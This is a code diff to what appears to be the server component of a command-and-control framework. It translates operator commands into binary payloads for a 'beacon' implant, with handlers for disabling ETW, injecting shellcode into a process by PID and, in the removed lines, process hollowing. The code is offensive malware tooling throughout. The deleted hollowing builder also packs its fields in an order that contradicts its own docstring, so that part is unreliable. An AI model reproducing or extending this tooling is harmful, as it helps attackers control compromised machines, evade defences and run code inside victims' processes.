@@ -22,7 +22,6 @@ MAX_CMD_LEN = 8192
 MAX_BOF_SIZE = 1 * 1024 * 1024       # 1 MB
 MAX_SHELLCODE_SIZE = 1 * 1024 * 1024  # 1 MB
 MAX_PATH_LEN = 512
-MAX_HOLLOWING_PAYLOAD = 16 * 1024 * 1024  # 16 MB
 
 
 # ── Public API ─────────────────────────────────────────────────────
@@ -32,7 +31,7 @@ def build_payload(opcode: int, payload: bytes, bof_metadata: dict = None) -> byt
     Translate a decoded GUI payload into the binary wire format the beacon expects.
 
     The `payload` argument is the base64-decoded bytes from the API request.
-    For commands that need file reads (BOF, inject, hollow, upload), the payload
+    For commands that need file reads (BOF, inject, upload), the payload
     is interpreted as a UTF-8 string containing a file path (and optionally
     additional space-separated parameters).
 
@@ -54,7 +53,6 @@ def build_payload(opcode: int, payload: bytes, bof_metadata: dict = None) -> byt
         S2BOpcode.ETW_ENABLE:      _build_etw_enable,
         S2BOpcode.ETW_DISABLE:     _build_etw_disable,
         S2BOpcode.INJECT_PROCESS:  _build_inject_process,
-        S2BOpcode.HOLLOW_PROCESS:  _build_hollow_process,
     }
 
     handler = handlers.get(opcode)
@@ -226,45 +224,3 @@ def _build_inject_process(payload: bytes) -> bytes:
         shellcode = f.read()
 
     return struct.pack('<II', pid, len(shellcode)) + shellcode
-
-
-def _build_hollow_process(payload: bytes) -> bytes:
-    """
-    Beacon expects: uint16_t path_len + path (UTF-16-LE) + uint32_t payload_size + payload_pe
-
-    GUI sends: "C:\\target\\proc.exe /path/to/payload.pe"  (space-separated)
-    """
-    text = _decode_str(payload).strip()
-    if not text:
-        raise ValueError("Hollow process payload is empty")
-
-    parts = text.split(maxsplit=1)
-    if len(parts) < 2:
-        raise ValueError("Hollow payload must contain: target_process payload_path")
-
-    target_path = parts[0].strip()
-    payload_path = parts[1].strip()
-
-    if not os.path.isfile(payload_path):
-        raise ValueError(f"Payload file not found: {payload_path}")
-
-    file_size = os.path.getsize(payload_path)
-    if file_size == 0:
-        raise ValueError(f"Payload file is empty: {payload_path}")
-    if file_size > MAX_HOLLOWING_PAYLOAD:
-        raise ValueError(
-            f"Payload too large: {file_size} bytes (max {MAX_HOLLOWING_PAYLOAD})"
-        )
-
-    with open(payload_path, 'rb') as f:
-        payload_data = f.read()
-
-    if len(target_path) > MAX_PATH_LEN:
-        raise ValueError(f"Target path too long: {len(target_path)} > {MAX_PATH_LEN}")
-
-    path_utf16 = target_path.encode('utf-16-le')
-    return (
-        struct.pack('<HI', len(target_path), len(payload_data))
-        + path_utf16
-        + payload_data
-    )
